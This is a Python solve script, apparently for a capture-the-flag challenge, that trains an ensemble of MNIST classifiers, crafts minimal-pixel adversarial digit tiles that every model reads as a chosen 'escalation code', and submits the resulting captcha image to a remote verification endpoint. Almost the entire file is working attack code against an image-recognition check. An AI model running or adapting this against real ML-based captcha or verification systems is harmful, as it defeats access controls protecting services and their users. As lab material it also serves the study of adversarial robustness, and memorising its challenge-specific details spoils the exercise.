#!/usr/bin/env python3
"""OmniDigit: ensemble-robust minimal-L0 adversarial tiles for better transfer.
Train several diverse MNIST CNNs, craft <=16px tiles that ALL of them read as the
target digit, compose the escalation code, submit."""
import glob, io, os, sys, numpy as np, requests, torch, torch.nn as nn, torch.nn.functional as F
import torchvision, torchvision.transforms as T
from PIL import Image

IP="154.57.164.73"; PORT="31374"; H="staging.phantomkernel.htb"
URL=f"http://{IP}:{PORT}/omnidigit/api/verify"; HEAD={"Host":H}
BANK="exam/loot/omnidigit/bank"
DATA="solve/.mnist"
dev=torch.device("mps") if torch.backends.mps.is_available() else torch.device("cpu")
L0MAX=16; MEAN,STD=0.1307,0.3081

class A(nn.Module):
    def __init__(s):
        super().__init__(); s.c1=nn.Conv2d(1,32,3,padding=1); s.c2=nn.Conv2d(32,64,3,padding=1)
        s.f1=nn.Linear(64*7*7,128); s.f2=nn.Linear(128,10)
    def forward(s,x):
        x=F.max_pool2d(F.relu(s.c1(x)),2); x=F.max_pool2d(F.relu(s.c2(x)),2)
        return s.f2(F.relu(s.f1(torch.flatten(x,1))))
class B(nn.Module):
    def __init__(s):
        super().__init__(); s.c1=nn.Conv2d(1,16,5,padding=2); s.c2=nn.Conv2d(16,32,5,padding=2)
        s.f1=nn.Linear(32*7*7,100); s.f2=nn.Linear(100,10)
    def forward(s,x):
        x=F.max_pool2d(F.relu(s.c1(x)),2); x=F.max_pool2d(F.relu(s.c2(x)),2)
        return s.f2(F.relu(s.f1(torch.flatten(x,1))))
class Cmlp(nn.Module):
    def __init__(s):
        super().__init__(); s.f1=nn.Linear(784,256); s.f2=nn.Linear(256,128); s.f3=nn.Linear(128,10)
    def forward(s,x):
        x=torch.flatten(x,1); return s.f3(F.relu(s.f2(F.relu(s.f1(x)))))

def train_one(cls, seed):
    torch.manual_seed(seed)
    tf=T.Compose([T.ToTensor(), T.Normalize((MEAN,),(STD,))])
    tr=torchvision.datasets.MNIST(DATA,train=True,download=True,transform=tf)
    dl=torch.utils.data.DataLoader(tr,batch_size=256,shuffle=True)
    net=cls().to(dev); opt=torch.optim.Adam(net.parameters(),1e-3); net.train()
    for ep in range(3):
        for xb,yb in dl:
            xb,yb=xb.to(dev),yb.to(dev)
            opt.zero_grad(); F.cross_entropy(net(xb),yb).backward(); opt.step()
    net.eval(); return net

specs=[(A,1),(A,7),(B,3),(B,11),(Cmlp,5)]
models=[]
for i,(cls,seed) in enumerate(specs):
    p=f"solve/.ens_{i}.pt"
    net=cls().to(dev)
    if os.path.exists(p): net.load_state_dict(torch.load(p,map_location=dev)); net.eval()
    else:
        net=train_one(cls,seed); torch.save(net.state_dict(),p)
    models.append(net)
print("ensemble ready:",len(models),"models")

def norm(x): return (x-MEAN)/STD
def ens_logits(x28):  # (28,28) tensor
    xin=norm(x28).view(1,1,28,28)
    return [m(xin)[0] for m in models]
def margins(x28,tgt):
    out=[]
    for lg in ens_logits(x28):
        other=lg[torch.arange(10,device=dev)!=tgt].max()
        out.append(float(lg[tgt]-other))
    return out
def preds(x28):
    r=[]
    for lg in ens_logits(x28):
        r.append(int(lg.argmax()))
    return r

def load(tid): return np.asarray(Image.open(f"{BANK}/tile_{tid}.png").convert("L"),dtype=np.float32)/255.0
tiles={int(f.split('_')[-1].split('.')[0]):load(int(f.split('_')[-1].split('.')[0]))
       for f in glob.glob(f"{BANK}/tile_*.png")}

def greedy(src, tgt, budget=L0MAX):
    orig=torch.tensor(src,device=dev); x=orig.clone(); changed=set()
    for _ in range(budget):
        xr=x.clone().requires_grad_(True)
        # min-margin across ensemble -> maximize the worst model's target margin
        losses=[]
        for m in models:
            lg=m(norm(xr).view(1,1,28,28))[0]
            other=lg[torch.arange(10,device=dev)!=tgt].max()
            losses.append(lg[tgt]-other)
        loss=torch.stack(losses).min()   # improve worst case
        for m in models: m.zero_grad()
        loss.backward(); g=xr.grad.detach()
        up=(1.0-x)*torch.clamp(g,min=0); dn=x*torch.clamp(-g,min=0)
        gain=torch.maximum(up,dn).view(-1).clone()
        for idx in changed: gain[idx]=-1
        best=int(torch.argmax(gain))
        if gain[best]<=0: break
        r,c=divmod(best,28); x[r,c]=1.0 if g[r,c]>0 else 0.0; changed.add(best)
        if all(p==tgt for p in preds(x)) and min(margins(x,tgt))>2.0 and len(changed)>=3:
            break
    return x.detach().cpu().numpy(), int((x!=orig).sum().item())

def best_for(tgt):
    res=[]
    for tid,arr in tiles.items():
        adv,l0=greedy(arr,tgt)
        m=margins(torch.tensor(adv,device=dev),tgt)
        p=preds(torch.tensor(adv,device=dev))
        agree=sum(1 for q in p if q==tgt)
        res.append((agree,min(m),l0,tid,adv,p))
    res.sort(key=lambda r:(-r[0],-r[1],r[2]))
    return res

CODE=[int(c) for c in (sys.argv[1] if len(sys.argv)>1 else "133717")]
print("target",CODE)
chosen=[]
for pos,d in enumerate(CODE):
    agree,mm,l0,tid,adv,p=best_for(d)[0]
    print(f"pos{pos} d{d}: tile_{tid} agree{agree}/{len(models)} minMargin{mm:.2f} L0={l0} preds{p}")
    chosen.append(adv)
canvas=np.zeros((28,168),np.float32)
for i,a in enumerate(chosen): canvas[:,i*28:(i+1)*28]=a
u8=(canvas*255).round().clip(0,255).astype(np.uint8)
Image.fromarray(u8,"L").save("exam/loot/omnidigit/attack_ens.png")
b=io.BytesIO(); Image.fromarray(u8,"L").save(b,"PNG"); b.seek(0)
r=requests.post(URL,headers=HEAD,files={"file":("captcha.png",b,"image/png")},timeout=40)
print("SERVER:",r.status_code,r.text.strip())
